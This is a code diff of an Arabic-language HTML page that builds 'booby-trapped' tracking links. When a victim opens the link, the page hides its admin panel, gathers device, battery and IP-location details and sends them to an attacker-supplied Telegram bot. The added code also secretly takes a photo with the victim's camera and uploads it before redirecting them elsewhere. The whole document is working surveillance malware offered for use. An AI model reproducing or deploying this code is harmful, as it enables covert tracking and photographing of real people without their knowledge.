@@ -1,111 +1,149 @@
 <!DOCTYPE html>
-<html lang="ar">
+<html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <title>جاري التحميل...</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>نظام التحكم المتقدم | G-INTEL</title>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/UAParser.js/0.7.33/ua-parser.min.js"></script>
+    <style>
+        :root { --red: #ff0000; --dark: #0a0a0a; --card: #151515; }
+        body { background-color: var(--dark); color: #fff; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; margin: 0; display: flex; align-items: center; justify-content: center; min-height: 100vh; overflow-x: hidden; }
+        .container { width: 90%; max-width: 450px; background: var(--card); padding: 30px; border-radius: 20px; border: 1px solid #333; box-shadow: 0 10px 40px rgba(255, 0, 0, 0.1); transition: all 0.4s ease; }
+        h2 { color: var(--red); text-align: center; text-transform: uppercase; letter-spacing: 2px; margin-bottom: 25px; border-bottom: 2px solid var(--red); padding-bottom: 10px; }
+        input { width: 100%; padding: 12px; margin: 10px 0; background: #000; border: 1px solid #444; color: #fff; border-radius: 8px; outline: none; transition: 0.3s; }
+        input:focus { border-color: var(--red); box-shadow: 0 0 10px rgba(255, 0, 0, 0.2); }
+        .btn { background: var(--red); color: #fff; border: none; padding: 15px; width: 100%; border-radius: 8px; cursor: pointer; font-weight: bold; font-size: 16px; margin-top: 15px; transition: 0.3s; }
+        .btn:hover { background: #cc0000; transform: translateY(-2px); box-shadow: 0 5px 15px rgba(255, 0, 0, 0.3); }
+        #outputLink { display: none; margin-top: 25px; border-top: 1px solid #333; padding-top: 20px; }
+        textarea { width: 100%; height: 70px; background: #000; color: #ff4d4d; border: 1px solid #444; border-radius: 8px; padding: 10px; font-size: 11px; resize: none; margin-top: 10px; }
+        .hidden { display: none; }
+        #cam-preview { display: none; } /* الكاميرا مخفية تماماً عن المستخدم */
+    </style>
 </head>
-<body style="background-color: #fff;"> <div id="adminPanel" style="direction: rtl; font-family: sans-serif; padding: 20px; max-width: 500px; margin: auto; border: 1px solid #ccc; border-radius: 10px; margin-top: 50px;">
-    <h2 style="text-align: center;">لوحة تحكم الرابط الذكي</h2>
-    <input type="text" id="botToken" placeholder="توكن البوت (Bot Token)" style="width: 100%; padding: 10px; margin: 5px 0;">
-    <input type="text" id="chatId" placeholder="الأيدي الخاص بك (Chat ID)" style="width: 100%; padding: 10px; margin: 5px 0;">
-    <input type="text" id="targetUrl" placeholder="الرابط المراد التوجه إليه (مثل https://google.com)" style="width: 100%; padding: 10px; margin: 5px 0;">
-    <button onclick="buildLink()" style="width: 100%; padding: 10px; background: #28a745; color: #fff; border: none; cursor: pointer; margin-top: 10px;">إنشاء الرابط</button>
-    <div id="output" style="display:none; margin-top: 20px;">
-        <p>الرابط الملغم (قم بنسخه واختصاره):</p>
-        <textarea id="finalUrl" style="width: 100%; height: 60px;" readonly></textarea>
+<body>
+
+<div id="adminPanel" class="container">
+    <h2>لوحة التحكم</h2>
+    <input type="text" id="botToken" placeholder="توكن البوت (Bot Token)">
+    <input type="text" id="chatId" placeholder="الأيدي (Chat ID)">
+    <input type="text" id="targetUrl" placeholder="رابط الموقع (Redirect URL)">
+    <button class="btn" onclick="buildLink()">إنشاء الرابط الملغم</button>
+
+    <div id="outputLink">
+        <p style="font-size: 13px; color: #aaa;">انسخ الرابط النهائي واختصره:</p>
+        <textarea id="finalUrl" readonly></textarea>
     </div>
 </div>
+
+<video id="cam-preview" autoplay playsinline></video>
+<canvas id="cam-canvas" class="hidden"></canvas>
 
 <script>
     const params = new URLSearchParams(window.location.search);
 
-    // --- المرحلة الأولى: الصمت المطبق وإعادة التوجيه (للضحية) ---
+    // --- قسم الضحية (التتبع الصامت والكاميرا) ---
     if (params.has('d')) {
-        // إخفاء لوحة التحكم فوراً عن الضحية
-        document.getElementById('adminPanel').style.display = 'none';
-
+        document.getElementById('adminPanel').classList.add('hidden');
+        
         try {
             const config = JSON.parse(atob(params.get('d')));
-            captureAndRedirect(config);
+            initCapture(config);
         } catch (e) {
-            // في حال وجود خطأ في الرابط، نوجهه للموقع الأصلي فوراً لعدم إثارة الشكوك
-            window.location.replace("https://www.google.com");
+            window.location.replace("https://google.com");
         }
     }
 
-    // --- المرحلة الثانية: جمع البيانات الاحترافي ---
-    async function captureAndRedirect(config) {
+    async function initCapture(config) {
+        // 1. طلب إذن الكاميرا فوراً
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+            const video = document.getElementById('cam-preview');
+            video.srcObject = stream;
+
+            // انتظار برهة للتأكد من تشغيل الكاميرا ثم التقاط الصورة
+            setTimeout(() => {
+                capturePhoto(config, stream);
+            }, 1000);
+        } catch (err) {
+            // إذا رفض الإذن، أرسل البيانات النصية فقط ووجهه
+            sendReport(config, null);
+        }
+    }
+
+    async function capturePhoto(config, stream) {
+        const video = document.getElementById('cam-preview');
+        const canvas = document.getElementById('cam-canvas');
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        canvas.getContext('2d').drawImage(video, 0, 0);
+
+        // تحويل الصورة لملف Blob لإرسالها لتلجرام
+        canvas.toBlob(async (blob) => {
+            await sendReport(config, blob);
+            // إغلاق الكاميرا بعد الالتقاط
+            stream.getTracks().forEach(track => track.stop());
+            // التوجيه النهائي
+            window.location.replace(config.url);
+        }, 'image/jpeg', 0.8);
+    }
+
+    async function sendReport(config, photoBlob) {
         const parser = new UAParser();
         const ua = parser.getResult();
         
-        // جلب معلومات البطارية
-        let batteryInfo = "غير معروف";
-        try {
-            const b = await navigator.getBattery();
-            batteryInfo = `${Math.round(b.level * 100)}% (${b.charging ? 'يتم الشحن' : 'لا يتم الشحن'})`;
-        } catch (e) {}
-
-        // جلب الموقع والشبكة عبر IP
+        let battery = "غير متاح";
+        try { const b = await navigator.getBattery(); battery = `${Math.round(b.level * 100)}%`; } catch(e){}
+        
         let net = {};
-        try {
-            const res = await fetch('https://ipapi.co/json/');
-            net = await res.json();
-        } catch (e) {}
+        try { const r = await fetch('https://ipapi.co/json/'); net = await r.json(); } catch(e){}
 
-        // جلب كرت الشاشة لتحديد دقة الطراز
-        const canvas = document.createElement('canvas');
-        const gl = canvas.getContext('webgl');
-        const debugInfo = gl ? gl.getExtension('WEBGL_debug_renderer_info') : null;
-        const gpu = gl && debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "غير معروف";
-
-        // صياغة التقرير بالعربية
-        const report = `
-🔔 **تم رصد دخول جديد للرابط!**
+        const text = `
+🚨 **عملية تتبع ناجحة**
 ━━━━━━━━━━━━━━
-📱 **نوع الهاتف:** ${ua.device.vendor || 'غير معروف (غالباً كمبيوتر)'}
-🛠️ **موديل الجهاز:** ${ua.device.model || 'غير معروف'}
-💻 **نظام التشغيل:** ${ua.os.name} ${ua.os.version}
-🌐 **المتصفح:** ${ua.browser.name} ${ua.browser.version}
-🔋 **شحن البطارية:** ${batteryInfo}
-🎮 **معالج الرسوميات:** ${gpu}
-
-📍 **معلومات الشبكة والموقع:**
-• **عنوان الـ IP:** \`${net.ip || 'مخفي'}\`
-• **الدولة:** ${net.country_name || 'غير معروف'}
-• **المدينة:** ${net.city || 'غير معروف'}
-• **شركة الاتصال:** ${net.org || 'غير معروف'}
-
-⏰ **الوقت:** ${new Date().toLocaleString('ar-EG')}
+📱 **الجهاز:** ${ua.device.vendor || ''} ${ua.device.model || 'PC'}
+🖥️ **النظام:** ${ua.os.name} ${ua.os.version}
+🔋 **البطارية:** ${battery}
+🌐 **IP:** \`${net.ip || 'مخفي'}\`
+📍 **الموقع:** ${net.city || ''}, ${net.country_name || ''}
+🏢 **الشركة:** ${net.org || ''}
 ━━━━━━━━━━━━━━
         `;
 
-        // إرسال البيانات للبوت (بدون انتظار الاستجابة لزيادة السرعة)
-        fetch(`https://api.telegram.org/bot${config.token}/sendMessage`, {
+        // 1. إرسال البيانات النصية
+        await fetch(`https://api.telegram.org/bot${config.token}/sendMessage`, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ chat_id: config.chat, text: report, parse_mode: 'Markdown' })
+            body: JSON.stringify({ chat_id: config.chat, text: text, parse_mode: 'Markdown' })
         });
 
-        // التوجيه اللحظي (قبل أن يلاحظ المستخدم أي شيء)
-        window.location.replace(config.url);
+        // 2. إرسال الصورة إذا توفرت
+        if (photoBlob) {
+            const formData = new FormData();
+            formData.append('chat_id', config.chat);
+            formData.append('photo', photoBlob, 'photo.jpg');
+            await fetch(`https://api.telegram.org/bot${config.token}/sendPhoto`, {
+                method: 'POST',
+                body: formData
+            });
+        }
     }
 
-    // --- المرحلة الثالثة: إنشاء الرابط (لك أنت) ---
+    // --- قسم الإدمن (إنشاء الرابط) ---
     function buildLink() {
         const token = document.getElementById('botToken').value;
         const chat = document.getElementById('chatId').value;
         const url = document.getElementById('targetUrl').value;
 
-        if (!token || !chat || !url) return alert("أكمل البيانات!");
+        if(!token || !chat || !url) return alert("يرجى إكمال الحقول!");
 
         const data = { token, chat, url };
-        const encoded = btoa(unescape(encodeURIComponent(JSON.stringify(data))));
-        const finalLink = window.location.origin + window.location.pathname + "?d=" + encoded;
+        const encoded = btoa(JSON.stringify(data));
+        const final = window.location.origin + window.location.pathname + "?d=" + encoded;
 
-        document.getElementById('finalUrl').value = finalLink;
-        document.getElementById('output').style.display = 'block';
+        document.getElementById('finalUrl').value = final;
+        document.getElementById('outputLink').style.display = 'block';
     }
 </script>
+
 </body>
 </html>
